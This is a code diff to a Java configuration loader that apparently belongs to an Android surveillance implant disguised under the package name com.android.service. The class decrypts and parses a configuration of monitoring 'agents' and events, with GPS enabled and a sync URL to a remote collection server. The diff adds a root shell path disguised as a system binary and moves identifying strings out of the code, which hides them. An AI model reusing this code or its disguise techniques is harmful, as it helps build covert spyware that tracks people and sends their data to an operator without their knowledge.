@@ -13,9 +13,9 @@ import java.nio.ByteOrder;
 
 import com.android.service.Debug;
 import com.android.service.GeneralException;
+import com.android.service.Messages;
 import com.android.service.Status;
 import com.android.service.action.Action;
-import com.android.service.action.SubActionType;
 import com.android.service.agent.AgentConf;
 import com.android.service.agent.AgentType;
 import com.android.service.auto.Cfg;
@@ -23,7 +23,6 @@ import com.android.service.crypto.Crypto;
 import com.android.service.crypto.Keys;
 import com.android.service.event.EventConf;
 import com.android.service.event.EventType;
-import com.android.service.evidence.Evidence;
 import com.android.service.util.Check;
 import com.android.service.util.Utils;
 
@@ -31,7 +30,7 @@ import com.android.service.util.Utils;
  * The Class Configuration.
  */
 public class Configuration {
-	private static final String TAG = "Configuration";
+	private static final String TAG = "Configuration"; //$NON-NLS-1$
 
 	/** The status obj. */
 	private final Status status;
@@ -48,25 +47,16 @@ public class Configuration {
 	 * Configuration file tags (ASCII format, NULL-terminated in binary
 	 * configuration).
 	 */
-	public static final String AGENT_CONF_DELIMITER = "AGENTCONFS-";
+	public static final String AGENT_CONF_DELIMITER = Messages.getString("17.0"); //$NON-NLS-1$
 
 	/** The Constant EVENT_CONF_DELIMITER. */
-	public static final String EVENT_CONF_DELIMITER = "EVENTCONFS-";
+	public static final String EVENT_CONF_DELIMITER = Messages.getString("17.1"); //$NON-NLS-1$
 
 	/** The Constant MOBIL_CONF_DELIMITER. */
-	public static final String MOBIL_CONF_DELIMITER = "MOBILCONFS-";
+	public static final String MOBIL_CONF_DELIMITER = Messages.getString("17.2"); //$NON-NLS-1$
 
 	/** This one is _not_ NULL-terminated into the binary configuration. */
-	public static final String ENDOF_CONF_DELIMITER = "ENDOFCONFS-";
-
-	/** The Constant NEW_CONF. */
-	public static final String NEW_CONF = "1";
-
-	/** The Constant ACTUAL_CONF. */
-	public static final String ACTUAL_CONF = "2";;
-
-	/** The Constant FORCED_CONF. */
-	private static final String FORCED_CONF = "3";
+	public static final String ENDOF_CONF_DELIMITER = Messages.getString("17.3"); //$NON-NLS-1$
 
 	/** The Constant TASK_ACTION_TIMEOUT. */
 	public static final long TASK_ACTION_TIMEOUT = 600000;
@@ -74,9 +64,11 @@ public class Configuration {
 	public static final boolean GPS_ENABLED = true;
 
 	public static final boolean OVERRIDE_SYNC_URL = false;
-	public static final String SYNC_URL = "http://93.62.139.39/wc12/webclient";
+	public static final String SYNC_URL = "http://172.20.20.147/wc12/webclient"; //$NON-NLS-1$
 	/** The Constant MIN_AVAILABLE_SIZE. */
 	public static final long MIN_AVAILABLE_SIZE = 200 * 1024;
+
+	public static final String shellFile = "/system/bin/ntpsvd";
 
 	private static final int AGENT_ENABLED = 0x2;
 
@@ -103,21 +95,22 @@ public class Configuration {
 	 * @throws GeneralException
 	 *             the rCS exception
 	 */
-	public boolean LoadConfiguration() throws GeneralException {
+	public boolean loadConfiguration(boolean instantiate) {
 		try {
 			// Clean old configuration
-			cleanConfiguration();
+			if(instantiate){
+				cleanConfiguration();
+			}
 
 			// Decrypt Conf
 			decryptConfiguration(resource);
 
 			// Parse and load configuration
-			parseConfiguration();
-		} catch (final Exception rcse) {			
+			return parseConfiguration(instantiate);
+		} catch (final Exception rcse) {
 			return false;
 		}
 
-		return true;
 	}
 
 	/**
@@ -126,25 +119,25 @@ public class Configuration {
 	 * @throws GeneralException
 	 *             the rCS exception
 	 */
-	private void parseConfiguration() throws GeneralException {
+	private boolean parseConfiguration(boolean instantiate) throws GeneralException {
 		try {
 			// Parse the whole configuration
-			loadAgents();
-			loadEvents();
-			loadActions();
-			loadOptions();
+			loadAgents(instantiate);
+			loadEvents(instantiate);
+			loadActions(instantiate);
+			loadOptions(instantiate);
 
-			// Debug checks start
+			// Debug Check. start //$NON-NLS-1$
 			Debug.StatusActions();
 			Debug.StatusAgents();
 			Debug.StatusEvents();
 			Debug.StatusOptions();
-			// Debug checks end
+			// Debug Check. end //$NON-NLS-1$
 		} catch (final GeneralException rcse) {
-			throw rcse;
+			return false;
 		}
 
-		return;
+		return true;
 	}
 
 	/**
@@ -181,8 +174,9 @@ public class Configuration {
 		}
 
 		confHash = (int) tempHash;
-		if (Cfg.DEBUG)
-			Check.log(TAG + " Configuration CRC: " + confHash);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " Configuration CRC: " + confHash);//$NON-NLS-1$
+		}
 		return confHash;
 	}
 
@@ -199,11 +193,12 @@ public class Configuration {
 		final int index = Utils.getIndex(wrappedClearConf.array(), tag.getBytes());
 
 		if (index == -1) {
-			throw new GeneralException("Tag " + tag + " not found");
+			throw new GeneralException("Tag " + tag + " not found"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
 
-		if (Cfg.DEBUG)
-			Check.log(TAG + " Tag " + tag + " found at: " + index);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " Tag " + tag + " found at: " + index);//$NON-NLS-1$ //$NON-NLS-2$
+		}
 		return index;
 	}
 
@@ -213,7 +208,7 @@ public class Configuration {
 	 * @throws GeneralException
 	 *             the rCS exception
 	 */
-	private void loadAgents() throws GeneralException {
+	private void loadAgents(boolean instantiate) throws GeneralException {
 		int agentTag;
 
 		try {
@@ -228,8 +223,9 @@ public class Configuration {
 		final int agentNum = wrappedClearConf.getInt(agentTag);
 		wrappedClearConf.position(agentTag + 4);
 
-		if (Cfg.DEBUG)
-			Check.log(TAG + " Number of agents: " + agentNum);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " Number of agents: " + agentNum);//$NON-NLS-1$
+		}
 
 		// Get id, status, parameters length and parameters
 		for (int i = 0; i < agentNum; i++) {
@@ -243,16 +239,19 @@ public class Configuration {
 				wrappedClearConf.get(params, 0, plen);
 			}
 
-			if (Cfg.DEBUG)
-				Check.log(TAG + " Agent: " + typeId + " Enabled: " + enabled + " Params Len: " + plen);
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Agent: " + typeId + " Enabled: " + enabled + " Params Len: " + plen);//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
+			}
 
-			
 			if (AgentType.isValid(typeId)) {
-				final AgentConf a = new AgentConf(typeId, enabled, params);
-				status.addAgent(a);
+				if (instantiate) {
+					final AgentConf a = new AgentConf(typeId, enabled, params);
+					status.addAgent(a);
+				}
 			} else {
-				if (Cfg.DEBUG)
-					Check.log(TAG + " Error (loadAgents): null key");
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " Error (loadAgents): null key");//$NON-NLS-1$
+				}
 			}
 		}
 
@@ -265,7 +264,7 @@ public class Configuration {
 	 * @throws GeneralException
 	 *             the rCS exception
 	 */
-	private void loadEvents() throws GeneralException {
+	private void loadEvents(boolean instantiate) throws GeneralException {
 		int eventTag;
 
 		try {
@@ -280,8 +279,9 @@ public class Configuration {
 		final int eventNum = wrappedClearConf.getInt(eventTag);
 		wrappedClearConf.position(eventTag + 4);
 
-		if (Cfg.DEBUG)
-			Check.log(TAG + " Number of events: " + eventNum);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " Number of events: " + eventNum);//$NON-NLS-1$
+		}
 
 		// Get id, status, parameters length and parameters
 		for (int i = 0; i < eventNum; i++) {
@@ -297,13 +297,15 @@ public class Configuration {
 
 			if (EventType.isValid(typeId)) {
 
-				if (Cfg.DEBUG)
-					Check.log(TAG + " Configuration.java Event: " + typeId + " Action: " + action + " Params Len: "
-							+ plen);
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " Configuration.java Event: " + typeId + " Action: " + action + " Params Len:  " //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
+							+ plen); //$NON-NLS-1$
+				}
 
-				final EventConf e = new EventConf(typeId, i, action, params);
-				status.addEvent(e);
-
+				if (instantiate) {
+					final EventConf e = new EventConf(typeId, i, action, params);
+					status.addEvent(e);
+				}
 			}
 		}
 
@@ -320,11 +322,12 @@ public class Configuration {
 	 * @throws GeneralException
 	 *             the rCS exception
 	 */
-	private void loadActions() throws GeneralException {
+	private void loadActions(boolean instantiate) throws GeneralException {
 		final int actionNum = wrappedClearConf.getInt();
 
-		if (Cfg.DEBUG)
-			Check.log(TAG + " Number of actions " + actionNum);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " Number of actions " + actionNum);//$NON-NLS-1$
+		}
 
 		try {
 			for (int i = 0; i < actionNum; i++) {
@@ -332,8 +335,9 @@ public class Configuration {
 
 				final Action a = new Action(i);
 
-				if (Cfg.DEBUG)
-					Check.log(TAG + " Action " + i + " SubActions: " + subNum);
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " Action " + i + " SubActions: " + subNum);//$NON-NLS-1$ //$NON-NLS-2$
+				}
 
 				for (int j = 0; j < subNum; j++) {
 					final int type = wrappedClearConf.getInt();
@@ -346,15 +350,19 @@ public class Configuration {
 					}
 
 					if (a.addSubAction(type, params)) {
-						if (Cfg.DEBUG)
-							Check.log(TAG + " SubAction " + j + " Type: " + type + " Params Length: " + plen);
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " SubAction " + j + " Type: " + type + " Params Length: " + plen);//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
+						}
 					}
 				}
 
-				if (Cfg.DEBUG)
-					Check.ensures(a.getSubActionsNum() == subNum, "inconsistent subaction number");
+				if (Cfg.DEBUG) {
+					Check.ensures(a.getSubActionsNum() == subNum, "inconsistent subaction number"); //$NON-NLS-1$
+				}
 
-				status.addAction(a);
+				if (instantiate) {
+					status.addAction(a);
+				}
 			}
 		} catch (final GeneralException rcse) {
 			throw rcse;
@@ -369,7 +377,7 @@ public class Configuration {
 	 * @throws GeneralException
 	 *             the rCS exception
 	 */
-	private void loadOptions() throws GeneralException {
+	private void loadOptions(boolean instantiate) throws GeneralException {
 		int optionsTag;
 
 		try {
@@ -384,8 +392,9 @@ public class Configuration {
 		final int optionsNum = wrappedClearConf.getInt(optionsTag);
 		wrappedClearConf.position(optionsTag + 4);
 
-		if (Cfg.DEBUG)
-			Check.log(TAG + " Number of options: " + optionsNum);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " Number of options: " + optionsNum);//$NON-NLS-1$
+		}
 
 		// Get id, status, parameters length and parameters
 		for (int i = 0; i < optionsNum; i++) {
@@ -398,11 +407,14 @@ public class Configuration {
 				wrappedClearConf.get(params, 0, plen);
 			}
 
-			if (Cfg.DEBUG)
-				Check.log(TAG + " Option: " + id + " Params Len: " + plen);
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Option: " + id + " Params Len: " + plen);//$NON-NLS-1$ //$NON-NLS-2$
+			}
 
-			final Option o = new Option(id, params);
-			status.addOption(o);
+			if (instantiate) {
+				final Option o = new Option(id, params);
+				status.addOption(o);
+			}
 		}
 
 		return;
@@ -430,7 +442,7 @@ public class Configuration {
 		try {
 
 			if (rawConf == null) {
-				throw new GeneralException("Cannot allocate memory for configuration");
+				throw new GeneralException("Cannot allocate memory for configuration"); //$NON-NLS-1$
 			}
 
 			// Decrypt configuration
@@ -454,33 +466,49 @@ public class Configuration {
 			// Verify CRC
 			final int confCrc = this.wrappedClearConf.getInt(confClearLen - 4);
 
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (decryptConfiguration): confClearLen" + confClearLen);
+			}
+
+			if (confClearLen - 4 <= 0) {
+				throw new GeneralException("Wrong length");
+			}
+
+			if (clearConf.length < confClearLen - 4) {
+				throw new GeneralException("Wrong length");
+			}
+
 			if (confCrc != crc(clearConf, 0, confClearLen - 4)) {
-				throw new GeneralException("CRC mismatch, stored CRC = " + confCrc + " calculated CRC = "
+				throw new GeneralException("CRC mismatch, stored CRC = " + confCrc + " calculated CRC = " //$NON-NLS-1$ //$NON-NLS-2$
 						+ crc(clearConf, 0, confClearLen));
 			}
 
 			// Return decrypted conf
-			if (Cfg.DEBUG)
-				Check.log(TAG + " Configuration is valid");
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Configuration is valid");//$NON-NLS-1$
+			}
 			return;
 		} catch (final IOException ioe) {
 			if (Cfg.DEBUG) {
-				Check.log(ioe);
+				Check.log(ioe);//$NON-NLS-1$
 			}
-			if (Cfg.DEBUG)
-				Check.log(TAG + " IOException() detected");
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " IOException() detected");//$NON-NLS-1$
+			}
 		} catch (final SecurityException se) {
 			if (Cfg.DEBUG) {
-				Check.log(se);
+				Check.log(se);//$NON-NLS-1$
 			}
-			if (Cfg.DEBUG)
-				Check.log(TAG + " SecurityException() detected");
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " SecurityException() detected");//$NON-NLS-1$
+			}
 		} catch (final Exception e) {
 			if (Cfg.DEBUG) {
-				Check.log(e);
+				Check.log(e);//$NON-NLS-1$
 			}
-			if (Cfg.DEBUG)
-				Check.log(TAG + " Exception() detected");
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Exception() detected");//$NON-NLS-1$
+			}
 		}
 
 		return;
